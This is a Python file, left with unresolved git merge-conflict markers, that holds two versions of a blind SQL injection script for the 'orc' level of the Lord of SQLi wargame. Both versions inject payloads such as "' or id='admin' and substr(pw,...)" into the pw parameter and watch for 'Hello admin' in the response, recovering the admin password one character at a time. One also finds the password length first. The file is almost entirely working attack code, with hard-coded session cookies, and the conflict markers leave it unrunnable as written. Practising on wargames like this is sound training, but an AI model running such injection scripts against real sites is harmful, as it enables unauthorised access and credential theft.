<<<<<<< HEAD
import requests

target = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
cookies = {"PHPSESSID": "q6g6gipia2tga8jpt11pvvanrb"}
length = 8

pw = str()

ds = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

print("Start")
for i in range(1, length + 1):
    for j in ds: 
        pay = f"?pw=' or id='admin' and substr(pw,{i},1)={j};%23"
        res = requests.get(target + pay, cookies=cookies)
        if "Hello admin" in res.text:
            pw += j
            print(j)
            break
print("pw :", pw)
=======
import urllib.request
from urllib.parse import quote

result = ""
pwlen = 0

for i in range(1,10):
    url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
    add_url = "' or length(pw)={} -- ;".format(i)
    print("Searching Password Length.. [{}]".format(i))
    add_url = quote(add_url)
    new_url = url + add_url
    re = urllib.request.Request(new_url)
    re.add_header("User-Agent","Mozilla/5.0")
    re.add_header("Cookie", "b4b7mgj4569eh4bd268dokc967")
    response = urllib.request.urlopen(re)

    if str(response.read()).find("Hello admin") != -1:
        pwlen = i
        print("Found length!! => {}".format(pwlen))
        break

for i in range(1,pwlen+1):
    for j in range(ord('0'),ord('z')):
        url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
        add_url = "' or id='admin' and substr(pw,1,{})='{}' -- ;".format(str(i), result+chr(j))
        print("Searching.. - {0}{1}".format(url, add_url))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)

        re.add_header("User-Agent","Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=b4b7mgj4569eh4bd268dokc967")

        res = urllib.request.urlopen(re)

        if str(res.read()).find("Hello admin") != -1:
            result += chr(j).lower()
            print("Found it!! => " + result)
            break

print("Finished Searching.")
print("Password : " + result)
>>>>>>> ed8de353916a7028504432d98986c7b1cf94b898
